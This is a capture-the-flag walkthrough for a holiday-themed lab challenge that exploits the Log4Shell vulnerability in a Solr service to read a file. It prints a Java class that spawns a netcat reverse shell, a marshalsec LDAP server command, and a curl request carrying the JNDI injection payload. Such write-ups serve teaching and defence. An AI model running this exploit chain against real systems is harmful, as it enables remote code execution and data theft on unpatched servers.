<h1 id="bonus-red-log4jack">Bonus Red Log4Jack</h1>
<p><strong>Location: North Pole</strong><br>
<strong>Troll: Icky McGoop</strong></p>
<p>This exercise runs in a Cranberry Pi terminal, focusing on exploiting the Log4J vulnerability recently discovered.<br>
Multiple terminal session are created automatically, one running a web server serving from <code>/home/troll/web</code> on port 8080, another one running a netcat listener on port 4444.</p>
<p>The objective is to retrieve the file <code>/home/solr/kringle.txt</code> from a web service running solr on <a href="http://solrpower.kringlecastle.com:8983/">http://solrpower.kringlecastle.com:8983/</a>.</p>
<p>First a Java class <code>YuleLogExploit</code> creating a reverse shell is created:</p>
<pre><code>public class YuleLogExploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc NETCATIP 4444 -e /bin/bash");
        } catch (Exception err) {
            err.printStackTrace();
        }
    }
}
</code></pre>
<p><em>NETCATIP</em> has to be replaced with the terminal’s IP address.<br>
This is placed in the web tree, so that the web server is able to hand out this class.<br>
Next the <a href="https://github.com/mbechler/marshalsec">marshalsec</a> installation residing in <code>/home/troll/marshalsec</code>  is started:</p>
<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://WEBSERVERIP:8080/#YuleLogExploit"
</code></pre>
<p><em>WEBSERVERIP</em> has to be replaced with the terminal’s IP address.<br>
This application acts as an LDAP server and uses the Java class on the web server as remote code base.</p>
<p>Finally the Log4J vulnerability is triggered:</p>
<pre><code>curl 'http://solrpower.kringlecastle.com:8983/solr/admin/cores?foo=$\{jndi:ldap://MARSHALSECIP:1389/YuleLogExploit\}'
</code></pre>
<p><em>MARSHALSECIP</em> has to be replaced with the terminal’s IP address.</p>
<p>This triggers on the solr server an LDAP connection to the mashalsec service, which in turn delivers the Java class hosted on the web server. The solr server then executes this class, effectively creating a reverse shell connection to the netcat listener. This allows the file <code>kringle.txt</code> to be retrieved.</p>
<pre><code>cat /home/solr/kringle.txt

The solution to Log4shell is patching.
Sincerely,

Santa
</code></pre>
<p>So <strong>patching</strong> is the solution.</p>
<p><strong>Achievement: Log4J Red Bonus</strong></p>

